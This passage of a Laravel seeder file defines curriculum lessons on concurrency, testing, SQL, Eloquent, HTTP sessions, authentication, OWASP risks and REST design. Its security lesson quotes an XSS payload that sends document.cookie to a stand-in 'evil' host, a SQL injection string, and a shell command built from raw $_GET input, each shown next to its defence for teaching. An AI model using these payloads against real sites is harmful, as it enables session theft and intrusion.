                        ['Recognition: the sentence that flags a DP problem', '"Count the ways / minimise the cost, where each choice leads to a smaller version of the same question." Counting with choices, min-cost paths, coin change, longest common subsequence — all wear that sentence. When you hear it: write the recurrence (state + transition) <em>before</em> any code; the recurrence is the solution, the code is transcription.'],
                        ['Practice it out loud', 'Print a binary tree level by level (name the data structure before you code), then compute naive vs memoised fibonacci and state both complexities out loud.'],
                        ['Interview drill', 'Level-order print of a tree — which structure and why? Then: memoised fib vs naive — explain exactly where the exponential time went.'],
                    ],
                ),
            ],

            // --- Stage 8 ---
            [
                'stage' => 'stage-8', 'code' => 'I1', 'slug' => 'i1-process-thread-async', 'order' => 0, 'sort' => 27,
                'title' => 'I1 — Processes, Threads, Concurrency vs Parallelism',
                'summary' => 'Definitions; shared memory; why web PHP is request-isolated.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'I1 — Concurrency Foundations',
                    'Stage 8 · Concurrency & Async · CS / PHP',
                    [
                        ['Four words people use interchangeably — and should not', '<ul><li><strong>Process</strong> — an isolated program instance with its own memory space; killing one does not touch another</li><li><strong>Thread</strong> — a unit of execution <em>sharing</em> the process memory it runs in</li><li><strong>Concurrency</strong> — multiple tasks in progress, possibly interleaved on one core (your web server handles many requests "at once" this way)</li><li><strong>Parallelism</strong> — genuinely simultaneous execution on multiple cores</li></ul> <p>A useful image: concurrency is juggling (one hand, many balls in flight), parallelism is two jugglers. PHP web work is overwhelmingly concurrency-shaped, not parallelism-shaped — which is the next point.</p>'],
                        ['Classic PHP: shared-nothing by design', 'Under PHP-FPM each request gets its own process (or worker), its own variables, its own lifetime — and when the response is sent, the workspace is destroyed. Nothing is shared between two requests <em>by default</em>: no in-memory session, no cached singleton, no static that "obviously" persists. Whatever must survive lives in the database, the cache, or the session store — external systems, not PHP memory.'],
                        ['Why this single fact explains half of web bugs', 'Because nothing is shared, state bugs cannot come from two requests touching the same variable — they come from two requests touching the same <em>row</em>. "Two users bought the last ticket" is a database race, not a PHP one. And the "you" of session design is an id in a cookie mapped to server-side storage, because the process that served page one is long gone by page two. Your mental model: stateless PHP, stateful storage.'],
                        ['Kitchen analogy you can reuse in interviews', 'Concurrency: one cook handling several pans, switching attention between them. Parallelism: two cooks, each with their own pan. A process is a kitchen with its own ingredients (memory); threads share the same fridge. The analogy also shows why sharing is where the burns happen.'],
                        ['Practice it out loud', 'Start two <code>php -r</code> processes that each write to a static variable — confirm neither can see the other — then explain what would have to change for them to communicate (sockets, files, a broker).'],
                        ['Interview drill', 'Concurrency vs parallelism with a kitchen analogy — then place PHP-FPM request handling on that map and justify it.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-8', 'code' => 'I2', 'slug' => 'i2-fibers-queues-races', 'order' => 1, 'sort' => 28,
                'title' => 'I2 — Fibers, Queues, Race Conditions',
                'summary' => 'PHP Fibers; background jobs; races, locks, idempotency.',
                'difficulty' => 'advanced', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'I2 — Fibers, Jobs, Races',
                    'Stage 8 · Concurrency & Async · PHP 8 / Laravel',
                    [
                        ['Fibers: cooperative multitasking without threads', 'PHP 8.1 added <code>Fiber</code> — a function you can pause mid-execution and resume later, letting one process interleave several logical tasks without OS threads (and without shared-memory races, since there is still one thread). Async frameworks build their event loops on this. What fibers are <em>not</em>: parallelism. A fiber only yields at an explicit suspension point, so a fiber stuck in blocking I/O stalls every other fiber — the framework must cooperate by suspending at I/O boundaries. You rarely write fibers by hand; understanding them explains how Laravel Octane and async HTTP clients behave.'],
                        ['Queues: the answer to "this request should not wait"', 'Slow, retryable, deferrable work — sending email, generating exports, calling webhooks — leaves the HTTP request and goes to a queue; a worker process picks it up and retries on failure. The design constraint that makes queues production-safe: <strong>workers will run your job more than once</strong> (a timeout, a redelivery, a crash after side effect but before ack). So the handler must be <strong>idempotent</strong>: running it twice must equal running it once — unique keys, status transitions, or check-then-act inside a transaction.'],
                        ['The race you can watch happen in slow motion', 'Two workers read <code>stock = 1</code> at the same moment, both see it available, both decrement to 0, and you have sold two of one unit. The window between read and write <em>is</em> the bug. Fixes, in order of preference: an atomic update (<code>UPDATE ... SET stock = stock - 1 WHERE stock &gt; 0</code>), or a transaction with a row lock (<code>SELECT ... FOR UPDATE</code>) so the second worker waits until the first commits. Optimistic concurrency (version column, retry on mismatch) is the alternative when locks would hold too long.'],
                        ['Deadlock: two locks, opposite orders', 'Task A holds lock 1 and waits for lock 2; task B holds lock 2 and waits for lock 1 — both wait forever. Prevention is order-based discipline: every code path acquires locks in the same global order (e.g. always <code>orders</code> before <code>payments</code>), plus lock timeouts as a seatbelt. If a system ever "just hangs" under load with no errors, deadlock is on the short list of suspects.'],
                        ['Practice it out loud', 'Write an idempotent "send welcome email" handler: decide what key makes the second run a no-op, then narrate what happens when the worker crashes between sending and marking complete.'],
                        ['Interview drill', 'How would you make "send welcome email" safe under retry? Where does idempotency live — in the job, the table, or the mailer?'],
                    ],
                ),
            ],

            // --- Stage 9 ---
            [
                'stage' => 'stage-9', 'code' => 'J1', 'slug' => 'j1-unit-feature-tests', 'order' => 0, 'sort' => 29,
                'title' => 'J1 — Unit & Feature Tests with Pest',
                'summary' => 'Arrange-Act-Assert; what to test; feature vs unit in Laravel.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'J1 — Testing Foundations',
                    'Stage 9 · Testing & Code Quality · Pest / Laravel',
                    [
                        ['A test is a spec that can fail', 'The value is not the green checkmark — it is the red one you get the moment a change breaks a behaviour someone depends on. Write the test while the correct behaviour is still fresh, and it becomes a permanent colleague asking "does this still work?" on every commit. Tests also document intent more honestly than comments: a comment claims what code does, a test proves it.'],
                        ['Arrange, Act, Assert — the rhythm every test follows', 'Set up the world (<strong>Arrange</strong>: create users, seed data), perform the one behaviour under test (<strong>Act</strong>), then assert the observable outcome (<strong>Assert</strong>). One Act per test is the discipline that matters: a test with three acts has three failure modes and tells you which behaviour actually broke only by luck.'],
                        ['What you test depends on the layer', '<ul><li><strong>Unit</strong> — one class or function, no HTTP, no database: fastest, most precise</li><li><strong>Feature</strong> — a route, a Livewire component, a job: real framework, database via <code>RefreshDatabase</code>, still fast enough for every push</li><li><strong>E2E</strong> — a real browser over the full stack: highest confidence, slowest, use sparingly for critical flows</li></ul>'],
                        ['Two tests, one file — watch the difference', '<pre><code>test("sums expenses", function () {\n    $total = sum([1.5, 2.5]);\n    expect($total)->toBe(4.0);\n});\n\ntest("requires auth", function () {\n    $this->get(route("learn.index"))->assertRedirect(route("login"));\n});</code></pre> <p>The first is a unit test: pure function, pure assertion. The second is a feature test: it drives the framework through the HTTP kernel and asserts the redirect — exactly the contract a logged-out user experiences. Same tool, very different questions asked.'],
                        ['What not to test — restraint is a skill', 'Framework internals (testing that Laravel routes works), trivial getters with no logic, and private details that would break if you refactored the implementation without changing behaviour. Every test you write is a test you maintain; a brittle suite gets deleted, and no suite is worse than an honest thin one.'],
                        ['Practice it out loud', 'Take any function you have written and give it three tests: the happy path, one edge case you can name, and one invalid input — then classify each as unit or feature and justify it.'],
                        ['Interview drill', 'Difference between a unit test and a feature test? When would you choose the slower one deliberately?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-9', 'code' => 'J2', 'slug' => 'j2-doubles-tdd-quality', 'order' => 1, 'sort' => 30,
                'title' => 'J2 — Test Doubles, TDD, Pint, Static Analysis',
                'summary' => 'Mocks/stubs/fakes; red-green-refactor; style + Larastan.',
                'difficulty' => 'advanced', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'J2 — Doubles, TDD, Quality Tools',
                    'Stage 9 · Testing & Code Quality · Pest / Laravel',
                    [
                        ['Test doubles: stand in for what you are not testing', 'A collaborator you do not care about gets replaced by a double: a <strong>stub</strong> returns canned answers ("the API says 200"), a <strong>mock</strong> asserts expectations ("this must be called exactly once with id 5"), and a <strong>fake</strong> is a working simplified stand-in — like the array cache driver replacing Redis. The choice is a question of what you are proving: behaviour of your code (stub/fake) versus an interaction contract with a collaborator (mock). Overuse of mocks couples tests to implementation; prefer fakes and assert on outcomes.'],
                        ['Red, green, refactor — a design tool wearing a testing hat', 'Write a test that fails for the right reason (<strong>red</strong>), write the minimal code that passes (<strong>green</strong>), then improve structure with the suite protecting you (<strong>refactor</strong>). The unexpected benefit is design pressure: code written to be testable from the first line tends to have clear inputs, outputs, and injected collaborators. Use it where it pays — new logic, bug fixes (write the failing test first: it proves you found the real cause) — not as a religion for every getter.'],
                        ['Three tools, three kinds of guarantee', '<code>vendor/bin/pint</code> fixes style mechanically so reviews never argue about braces; PHPStan/Larastan finds type errors your tests never think to trigger (wrong array shape, impossible null call); and Pest catches behaviour regressions. They fail at different times for different reasons — running all three is why CI is trustworthy rather than optional.'],
                        ['The loop you already have in this repo', 'After any change: <code>php artisan test --compact</code>, then Pint, then <code>vendor/bin/phpstan analyse</code>. This repository wires all of it into CI so a red build blocks merge — the same pipeline you would defend in a senior interview, running on code you actually wrote.'],
                        ['Practice it out loud', 'Take a method with an external collaborator, stub it, deliberately break the method, and confirm the test goes red for the reason you predicted — then fix it green.'],
                        ['Interview drill', 'When would you prefer a fake over a mock? What does a red build in CI actually protect the team from?'],
                    ],
                ),
            ],

            // --- Stage 10 ---
            [
                'stage' => 'stage-10', 'code' => 'K1', 'slug' => 'k1-sql-fundamentals', 'order' => 0, 'sort' => 31,
                'title' => 'K1 — SQL Fundamentals & Normalization',
                'summary' => 'Tables, keys, joins, indexes, ACID, basic normalization.',
                'difficulty' => 'intermediate', 'minutes' => 45, 'checkpoint' => false,
                'body' => $this->body(
                    'K1 — SQL Fundamentals',
                    'Stage 10 · Databases & Eloquent · SQL',
                    [
                        ['SQL describes the result you want, not the steps to get it', 'You declare <em>what</em> the answer looks like — rows from these joins, matching this filter, grouped that way — and the engine\'s planner decides how to fetch it. That declarative split is why the same query can be fast or slow without changing a character: the plan, not the syntax, decides. Start with the query below and read it as a sentence, clause by clause: <pre><code>SELECT u.id, COUNT(o.id)\nFROM users u\nJOIN orders o ON o.user_id = u.id\nWHERE u.active = 1\nGROUP BY u.id\nHAVING COUNT(o.id) > 0;</code></pre> <p>"For active users, join their orders, count them per user, and keep only those with at least one." Notice <code>WHERE</code> filters rows <em>before</em> grouping while <code>HAVING</code> filters the groups after — the distinction that trips up most first interviews.'],
                        ['Keys are identity; indexes are the lookup structure', 'A <strong>primary key</strong> uniquely identifies each row (one per table, usually the clustered structure itself); a <strong>foreign key</strong> links a row to another table\'s identity and can enforce referential integrity. An <strong>index</strong> is a separate sorted structure — a book\'s index — that speeds reads on the indexed columns at the cost of extra storage and slower writes (every insert maintains every index). Index the columns you filter, join, and sort on with high selectivity; that is the whole heuristic.'],
                        ['ACID is what "the money is safe" means', '<strong>A</strong>tomicity — all statements in the transaction commit or none do. <strong>C</strong>onsistency — constraints hold after commit. <strong>I</strong>solation — concurrent transactions do not corrupt each other\'s view. <strong>D</strong>urability — a committed transaction survives a crash. Together they turn "transfer $100" from two risky writes into one trustworthy unit — the reason K3 exists.'],
                        ['Normalise first; denormalise with a measurement', 'Normalisation removes redundancy: 1NF (atomic values, no repeating groups), 2NF (no partial dependency on part of a composite key), 3NF (no transitive dependency on a non-key column). Each normal form eliminates a class of update anomaly — change an email in one place, not seven. Denormalisation is the deliberate reversal for read-heavy paths: duplicate data for query speed, and accept that a write now updates two places — a trade you make only when a measured query demands it.'],
                        ['Practice it out loud', 'Write the query above from memory, then remove <code>HAVING</code> and predict what rows appear before you run it.'],
                        ['Interview drill', 'When does an index <em>not</em> help? Explain the N+1 problem at the SQL level — how many queries does a naive loop issue?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-10', 'code' => 'K2', 'slug' => 'k2-eloquent-patterns', 'order' => 1, 'sort' => 32,
                'title' => 'K2 — Eloquent ORM Patterns',
                'summary' => 'Models, relations, eager loading, factories, transactions, N+1.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'K2 — Eloquent',
                    'Stage 10 · Databases & Eloquent · Laravel',
                    [
                        ['A model is a class that knows its table', 'Eloquent maps each row to an object: <code>User</code> ↔ <code>users</code>, with <code>$fillable</code> guarding mass assignment, <code>casts</code> converting columns to types on the way out, and the query builder available as static calls. This repository is your live reference — open <code>app/Models/User.php</code> and <code>app/Models/Lesson.php</code> and you will find every concept in this lesson wired to real tables.'],
                        ['Relations are methods that return query builders', '<code>belongsTo</code>, <code>hasMany</code>, <code>belongsToMany</code> — each declares how two tables connect in one place instead of scattering joins across the codebase. The Lesson ↔ prerequisites relation in this app is a <code>belongsToMany</code> with a pivot table: read it after this section and the vocabulary stops being abstract.'],
                        ['N+1: the query bug Eloquent makes easy', '<pre><code>// bad — 1 query for lessons + 1 per lesson for its stage\nforeach (Lesson::all() as $l) { $l->stage->title; }\n\n// good — 2 queries total, regardless of row count\nLesson::with("stage")->get();</code></pre> <p>Each access of a not-yet-loaded relation fires its own query: fifty lessons means fifty-one queries. <code>with()</code> eagerly loads the relation in one extra query up front. Predict the symptom before you learn it: the page "feels fine in dev" (3 rows) and takes seconds in production (3,000 rows). The tell is a query count, not a slow query log entry.'],
                        ['Testing against a database you throw away', 'Model factories generate realistic rows; <code>RefreshDatabase</code> wraps each test in a transaction (or migrates fresh on sqlite <code>:memory:</code>) so tests never see each other\'s data. The rule: prefer factories over hand-inserted arrays — a factory keeps working when the schema gains a required column, while raw inserts rot silently.'],
                        ['Practice it out loud', 'Enable the query log around a relation loop, count the queries, add <code>with()</code>, recount — the before/after numbers are your N+1 story for interviews.'],
                        ['Interview drill', 'How does eager loading fix N+1 — and at the SQL level, what query does <code>with()</code> actually add? When do you wrap updates in a transaction?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-10', 'code' => 'K3', 'slug' => 'k3-transactions-performance', 'order' => 2, 'sort' => 33,
                'title' => 'K3 — Transactions, Locking, Query Performance',
                'summary' => 'Isolation, deadlocks, explain plans, connection concerns.',
                'difficulty' => 'advanced', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->body(
                    'K3 — Transactions & Performance',
                    'Stage 10 · Databases & Eloquent · SQL / Laravel',
                    [
                        ['A transaction is a promise about several writes', '<code>DB::transaction(fn () =&gt; ...)</code> commits every write as one unit or rolls back all of them on exception — no half-created order with no order items. Nesting uses savepoints so an inner failure can undo just the inner work. The senior instinct: anything that must be true <em>together</em> in the data — money moved, stock decremented and order placed, parent created with children — lives inside one transaction, short and explicit.'],
                        ['Isolation levels are the price of concurrent readers', 'How much can one transaction see of another\'s uncommitted work? <strong>Read committed</strong> — no dirty reads (you never see uncommitted data). <strong>Repeatable read</strong> — the same query twice returns the same snapshot. <strong>Serializable</strong> — full serial execution semantics, most locking. Each level trades concurrency for predictability: dirty reads corrupt decisions, phantoms break "count then insert" logic. You rarely pick these by hand in Laravel — but explaining <em>which anomaly</em> you are protecting against is exactly what separates a senior answer from "use transactions".'],
                        ['Locking: pessimistic waits, optimistic retries', 'Pessimistic locking (<code>SELECT ... FOR UPDATE</code>) says "nobody touch this row until I commit" — simple, correct, and a deadlock risk if ordering is inconsistent. Optimistic concurrency reads a version column and fails the write if anyone changed it in between — no waiting, but the caller retries. Choose pessimistic for short contended writes (inventory), optimistic when conflicts are rare or lock hold times would be long. Deadlock recovery is the same in both worlds: consistent lock order plus bounded retries.'],
                        ['Performance work starts at the plan, not the code', 'Run <code>EXPLAIN</code> first: does it scan the whole table (<code>type: ALL</code>), use an index, filesort the result? Fixes in order of payoff — the right index (ideally covering, so columns come from the index alone), pagination instead of unbounded results, selecting only needed columns instead of <code>SELECT *</code>, killing N+1 (K2), and only then caching hot reads. Each step is justified by the plan you re-run afterwards, not by intuition.'],
                        ['Practice it out loud', 'Take a two-step write (order + items), wrap it in a transaction, throw deliberately after the first insert, and prove rollback left no orphan row.'],
                        ['Interview drill', 'Walk through preventing overselling inventory under concurrency: which statement is atomic, which lock do you take, and what does the second buyer\'s request see?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-10', 'code' => 'K4', 'slug' => 'k4-data-mapper-eloquent', 'order' => 3, 'sort' => 34,
                'title' => 'K4 — Data Mapper → Eloquent',
                'summary' => 'Hand-build Identity Map + Unit of Work, then map each idea to Eloquent.',
                'difficulty' => 'advanced', 'minutes' => 45, 'checkpoint' => true,
                'body' => $this->body(
                    'K4 — Data Mapper & Eloquent Equivalents',
                    'Stage 10 · Databases & Eloquent · CS / Laravel',
                    [
                        ['The problem that birthed Data Mapper', 'If every domain object runs its own SQL, your business logic and your storage are welded together: unit-testing a rule means standing up a database, and changing the schema means touching the domain. A <strong>mapper</strong> sits between — objects stay pure PHP, tables stay SQL, and one layer owns the translation. This is the architecture question behind "why does your ORM exist at all?".'],
                        ['The Data Mapper in one class', 'A mapper is the only place SQL lives: <pre><code>class UserMapper {\n    public function find(int $id): User { /* SELECT ... hydrate User */ }\n    public function save(User $u): void { /* INSERT/UPDATE ... */ }\n}</code></pre> <p>The domain object never learns a table name; the mapper never holds a business rule. That boundary is what lets you swap MySQL for an API or a legacy schema without rewriting loan-interest calculations.</p>'],
                        ['Identity Map: one object per row, per unit of work', 'Without it, two <code>find(7)</code> calls return two distinct <code>User</code> instances — edit one and the other silently disagrees: stale copies, surprise aliasing, "why did my change disappear?". The Identity Map fixes it by remembering every hydrated id for the lifetime of the work: the second <code>find(7)</code> hands back the <em>same</em> object the first one did. One row, one object, no duplicate identities.'],
                        ['Unit of Work: one commit for the whole transaction', 'Instead of each <code>save()</code> firing its own commit, the Unit of Work tracks inserts, updates, and deletes and flushes them as a single transaction. Failure means none of it happened; success means all of it did — and the database sees one round trip instead of twenty. This is the pattern behind "changes flush at the end" behaviour you will see named in ORM literature.'],
                        ['Eloquent already is all of this — mapped', 'Model registry ≈ Identity Map for hydrated rows; <code>DB::transaction()</code> and batched <code>save()</code> calls ≈ Unit of Work; the model + query builder together ≈ the mapper surface. Lazy relations and <code>with()</code> are load strategies layered on top, not magic. Knowing the classic names lets you read any ORM documentation — and answer "what does the identity map prevent?" without having memorised a Laravel-specific script.'],
                        ['When to hand-build it', 'Legacy schema no ORM will touch, a strict "no framework in domain" rule, or — most usefully — as a learning exercise: building a fifty-line Identity Map teaches you more in an afternoon than reading about one. In a normal Laravel app, Eloquent has already paid this cost; adding your own mapper layer on top is abstraction theatre.'],
                        ['Practice it out loud', 'Sketch the four pieces (mapper, identity map, unit of work, lazy load) as boxes, then find the Eloquent counterpart of each in this repository by name.'],
                        ['Interview drill', 'What does an Identity Map prevent? How does Eloquent approximate it — and what is still left to you (hint: within one request, across long jobs)?'],
                    ],
                ),
            ],

            // --- Stage 11 ---
            [
                'stage' => 'stage-11', 'code' => 'L1', 'slug' => 'l1-http-sessions', 'order' => 0, 'sort' => 34,
                'title' => 'L1 — HTTP, Sessions, Cookies',
                'summary' => 'Methods, status, headers, cookies, session lifecycle, request/response.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'L1 — HTTP & Sessions',
                    'Stage 11 · Networking & Security · HTTP / Laravel',
                    [
                        ['HTTP, seen from the wire', 'Everything your app sends is plain text a browser (or curl) could print. Watch one request: <pre><code>GET /learn HTTP/1.1\nHost: 127.0.0.1:8000\nCookie: laravel_session=...</code></pre> <p>The method says what you want done (<strong>GET</strong> is safe and cacheable, <strong>POST</strong> creates, <strong>PUT/PATCH</strong> updates, <strong>DELETE</strong> removes), the path picks the resource, headers carry metadata, and the cookie carries your identity. The response mirrors it: a status line (200 ok, 302 redirect, 403 forbidden, 404 missing, 422 invalid, 500 broken), headers, and a body.</p>'],
                        ['Statelessness is the feature that forced sessions into existence', 'HTTP remembers nothing: each request arrives as if it were the first. Login therefore cannot live "in the server process" — it must be re-proven every time. The resolution is an indirection: the cookie holds a session <em>id</em> only, the server stores the data (<code>SESSION_DRIVER=database</code> in this app), and each request uses the id to fetch its state. Note what that design implies: the id is the key, which is why stealing the cookie steals the session — motivating every cookie flag below.'],
                        ['Cookie flags: three lines that carry most web security', '<ul><li><strong>HttpOnly</strong> — JavaScript cannot read the cookie, so an XSS payload cannot exfiltrate the session id</li><li><strong>Secure</strong> — only sent over HTTPS, so a network sniffer never sees it</li><li><strong>SameSite</strong> — withheld on cross-site requests, which is a large part of CSRF defence</li></ul> Laravel sets all three; knowing <em>why</em> each exists is the interview version.'],
                        ['Sessions in practice in this app', 'Fortify writes <code>auth.login</code> into the session on login; the session id travels in the cookie; middleware resolves it to a user before any route action runs. When you debug "why am I logged out?" you now have a checklist: cookie flags, session driver, load-balancer stickiness, lifetime — the same list as the D/debugging lessons, now with mechanism behind it.'],
                        ['Practice it out loud', 'Open devtools, copy your session cookie, and trace where Laravel reads it (session middleware) — then log out and confirm the id rotates.'],
                        ['Interview drill', 'How does a logged-in request identify the user, end to end, in five steps? Why is the session id, not the user id, what the cookie carries?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-11', 'code' => 'L2', 'slug' => 'l2-auth-authz', 'order' => 1, 'sort' => 35,
                'title' => 'L2 — Authentication vs Authorization',
                'summary' => 'Login, password hashing, Fortify flows, policies/roles, session fixation.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'L2 — Authentication & Authorization',
                    'Stage 11 · Networking & Security · Laravel / Fortify',
                    [
                        ['Two questions that sound alike and never are', '<strong>Authentication (authn)</strong> answers "who are you?" — a login, a token, a fingerprint. <strong>Authorization (authz)</strong> answers "what may you do?" — roles, policies, permissions. You can be fully authenticated and still forbidden: every 403 in your logs is authz, every failed login is authn. Interviewers ask this pair precisely because candidates merge them.'],
                        ['Passwords: verify, never compare', 'Storing plaintext (or worse, an unsalted hash) means one database leak is every password. Laravel\'s default bcrypt/argon2 hashes are salted per-user and deliberately slow, so <code>Hash::check($input, $user->password)</code> is the only correct comparison — a direct <code>===</code> against a stored hash is both wrong and a review-blocking smell. Reset tokens are one-time with expiry, consumed on use.'],
                        ['How this app wires both together', 'Fortify owns the authn flows (register, login, password reset) — read <code>app/Actions/Fortify/CreateNewUser.php</code> to see validation and hashing in one Action class. Authz is a Gate: <code>Gate::define("admin", ...)</code> plus <code>can:admin</code> middleware on admin routes, keyed off <code>users.role</code>. Add an "editor" role tomorrow and the shape is: new gate definition, apply it where editors go — nothing in the login flow changes, which is exactly the separation of concerns.'],
                        ['Session fixation and why ids rotate', 'If an attacker can plant a known session id before login (in a URL, say) and the app does not rotate it, the attacker\'s id becomes authenticated after the victim logs in — the attacker now rides the victim\'s session. Laravel regenerates the id on login, killing the planted value. Paired with rate-limited attempts, this covers the two classic session-attack paths.'],
                        ['Practice it out loud', 'Trace a login end to end in this app: request → Fortify → hash check → session regenerate → redirect — then explain which step each of authn, authz, and fixation-defence occupies.'],
                        ['Interview drill', 'authn vs authz? How would you add an "editor" role — what files change, and what deliberately does not?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-11', 'code' => 'L3', 'slug' => 'l3-owasp-top-risks', 'order' => 2, 'sort' => 36,
                'title' => 'L3 — OWASP: XSS, CSRF, SQLi, Injection',
                'summary' => 'Attack mechanism + production prevention; escaping; parameter binding.',
                'difficulty' => 'advanced', 'minutes' => 45, 'checkpoint' => false,
                'body' => $this->body(
                    'L3 — Common Web Vulnerabilities',
                    'Stage 11 · Networking & Security · OWASP',
                    [
                        ['XSS: your page running someone else\'s code', 'The mechanism: input is stored or reflected, then printed into the page without escaping, and the browser happily executes the injected <code>&lt;script&gt;</code> in <em>your</em> origin — with your user\'s cookies and session. Conceptually the payload is just <code>&lt;script&gt;fetch("//evil?c="+document.cookie)&lt;/script&gt;</code> (cookie theft is blunted by HttpOnly from L1, but actions as the user still work). The defence is escaping at the output boundary — Laravel\'s <code>{{ }}</code> escapes by default; <code>{!! !!}</code> is the "I accept this risk, it is trusted HTML" button — plus a Content-Security-Policy header as defence in depth. The rule to carry: escape on <em>output</em>, not on input, because the same value may be printed in five contexts.'],
                        ['CSRF: the browser sends your cookie for you', 'A forged site issues a state-changing request to yours, and the browser attaches your session cookie automatically — no script needed, no cookie stolen. Because cookies are ambient credentials, "the request came from my session" does not mean "the user intended it". Laravel\'s answer: a per-session token in the form (<code>@csrf</code>) that a cross-site page cannot read, plus <code>SameSite</code> cookies withholding the cookie on cross-site requests in the first place. Note that GET must never mutate state — a GET that writes is unprotectable by tokens.'],
                        ['SQL injection: when input becomes grammar', 'The mechanism: user input concatenated into SQL turns data into structure — <code>name = "x\' OR 1=1 --"</code> changes the query\'s meaning entirely. One character class apart sits the defence: <em>bound parameters</em> — the driver sends the query template and the values separately, so the server never parses input as SQL. Eloquent and the query builder parameterise by default; you become vulnerable only by opting out (<code>DB::raw</code> with concatenated input).'],
                        ['Command injection and SSRF: the same mistake, different interpreter', 'Passing user input to a shell (<code>exec("convert ".$_GET["f"])</code>) or fetching a user-supplied URL server-side are the pattern behind the rest of the OWASP top ten. The CodeRunner in this app is the local example: it allowlists operations and blocklists dangerous functions rather than trusting input. Defence shape for both: allowlist known-good values, never build commands or internal URLs from raw input, and keep dangerous functions disabled where you do not need them.'],
                        ['Practice it out loud', 'Find one place this app prints user-influenced text, state which escaping rule protects it, then name the request property you would check to detect an attempted XSS in logs.'],
                        ['Interview drill', 'Show conceptually how an XSS payload works and exactly where Laravel escaping stops it — then distinguish it from CSRF in one sentence each.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-11', 'code' => 'L4', 'slug' => 'l4-rest-apis', 'order' => 3, 'sort' => 37,
                'title' => 'L4 — REST, JSON, Status Codes, Idempotency',
                'summary' => 'Resource design, pagination, validation errors, versioning.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'L4 — REST API Design',
                    'Stage 11 · Networking & Security · HTTP / Laravel',
                    [
                        ['Resources, not verbs-in-URLs', 'REST says model your API as nouns and let HTTP methods carry the verb — the five-line shape below is the whole pattern: <pre><code>GET    /api/lessons        // list\nPOST   /api/lessons        // create\nGET    /api/lessons/{id}   // read one\nPATCH  /api/lessons/{id}   // partial update\nDELETE /api/lessons/{id}   // remove</code></pre> <p>A URL like <code>/getLesson</code> or <code>/deleteUserAction</code> leaks procedural thinking into the address space and breaks caching/semantics down the line. Nested resources (<code>/users/{id}/lessons</code>) express ownership; deeper nesting than two levels usually means a flat resource plus a query filter is clearer.</p>'],
                        ['Status codes are the API\'s type system', 'Clients branch on status before they parse bodies: <strong>200/201</strong> success, <strong>204</strong> success without content, <strong>400/422</strong> malformed or invalid input, <strong>401</strong> not authenticated, <strong>403</strong> authenticated but not allowed, <strong>404</strong> no such resource, <strong>409</strong> conflict with current state, <strong>500</strong> server fault. The subtle pair — 401 vs 403 — is worth internalising because mobile clients legitimately treat them differently.'],
                        ['Errors should look the same every time', 'One JSON error shape across the whole API — Laravel\'s validation convention <code>{"message": "...", "errors": {...}}</code> — so clients have one contract instead of per-endpoint archaeology. Validate <em>before</em> the write, return 422 with field-level errors, and let the client map them to form fields. A 500 that leaks a stack trace to a third-party consumer is an information disclosure bug as well as a bad experience.'],
                        ['Idempotency: making retries safe', 'GET, PUT, PATCH, and DELETE are defined to have the same effect when repeated — so a client (or proxy) may retry them freely. POST is not: a retried payment POST can double-charge. The fix for the unsafe one is an <strong>idempotency key</strong> — a client-generated token the server stores with the first response, returning that same response for any replay. You met the same idea in I2\'s queue jobs: retries are a fact of networks, so safe repetition is a design requirement, not paranoia.'],
                        ['Practice it out loud', 'Design the endpoints for "lesson completion" as pure resources — then take <code>POST /complete</code> and defend or reject it on idempotency grounds.'],
                        ['Interview drill', 'PATCH vs PUT — what does each assume about missing fields? When is POST idempotent, and how do you make it so?'],
                    ],
                ),
            ],

            // --- Stage 12 ---
            [
                'stage' => 'stage-12', 'code' => 'M1', 'slug' => 'm1-routing-middleware', 'order' => 0, 'sort' => 38,
                'title' => 'M1 — Routing, Middleware, Request Lifecycle',
                'summary' => 'Named routes; middleware order; bootstrapping; Livewire lifecycle.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'M1 — Routing & Middleware',
                    'Stage 12 · Backend / Laravel Production · Laravel',
                    [
                        ['Trace one request before you learn the parts', 'Follow <code>GET /roadmap</code> from socket to screen: <pre><code>HTTP → public/index.php\n → bootstrap/app.php\n → global middleware\n → route middleware (web, auth, can)\n → controller / Livewire page\n → response</code></pre> <p>Every layer is a chance to answer, redirect, or modify — and the response then travels back out through the same middleware in reverse. This diagram is the single most reused artifact in Laravel interviews: draw it once and "where does CSRF get checked?" or "where would you add a header?" become placement questions on a map you already own.</p>'],
                        ['Routes: name everything you link to', 'Routes map method + path to an action; naming them (<code>route(\'lessons.show\', $lesson)</code>) means a URL restructure is one change, not a find-and-replace across templates — and the helper validates that the route exists at all. Group by shared middleware: <code>auth</code> around everything private, <code>can:admin</code> around admin. This repo\'s <code>routes/web.php</code> is small enough to read end to end; do that now and the abstraction stops being a framework opinion.'],
                        ['Middleware: layers that wrap every request', 'Sessions, CSRF verification, authentication, rate limits, and authorization are <em>cross-cutting</em> — they apply to many or all routes, so putting them in each controller would be copy-paste with holes. Middleware keeps them as composable layers, and <strong>order matters</strong>: authentication must run before <code>can:admin</code>, or the authorization check receives no user at all. When debugging "why am I 403ing?", the middleware stack order is the first thing to inspect.'],
                        ['Livewire turns the same lifecycle into components', 'A Livewire page component runs <code>mount</code> → user actions (server-side methods) → <code>render</code>, with state living on the server between interactions rather than in browser JavaScript. The security consequence is the reason to prefer it for admin tooling: actions are real PHP methods with validation and authorisation opportunities, not client-trusted endpoints. Note the pattern though — this is a single application of the front-controller idea you will name in N6.'],
